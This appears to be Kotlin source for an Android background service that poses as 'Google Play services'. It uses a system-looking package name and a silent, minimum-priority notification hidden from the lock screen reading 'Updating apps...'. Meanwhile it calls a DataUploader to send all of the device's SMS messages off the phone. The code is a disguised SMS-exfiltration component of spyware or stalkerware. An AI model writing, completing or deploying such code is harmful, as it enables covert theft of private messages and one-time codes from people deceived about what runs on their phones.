package com.android.system.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.android.system.services.utils.DataUploader

class DataUploadService : Service() {

    companion object {
        private const val TAG = "DataUploadService"
        const val EXTRA_DEVICE_ID = "device_id"
        private const val NOTIFICATION_ID = 1
        private const val CHANNEL_ID = "sms_service_channel"
    }

    override fun onCreate() {
        super.onCreate()
        startForegroundNotification()
    }
    
    private fun startForegroundNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Google Play services",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Google Play services keeps your apps up to date"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Google Play services")
            .setContentText("Updating apps...")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setShowWhen(false)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setSilent(true)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(NOTIFICATION_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val deviceId = intent?.getStringExtra(EXTRA_DEVICE_ID)

        if (deviceId.isNullOrEmpty()) {
            stopSelf()
            return START_NOT_STICKY
        }

        Thread {
            try {
                DataUploader.uploadAllSms(this, deviceId)
            } catch (e: Exception) {
                Log.e(TAG, "Upload error: ${e.message}", e)
            } finally {
                stopSelf()
            }
        }.start()

        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
    }
}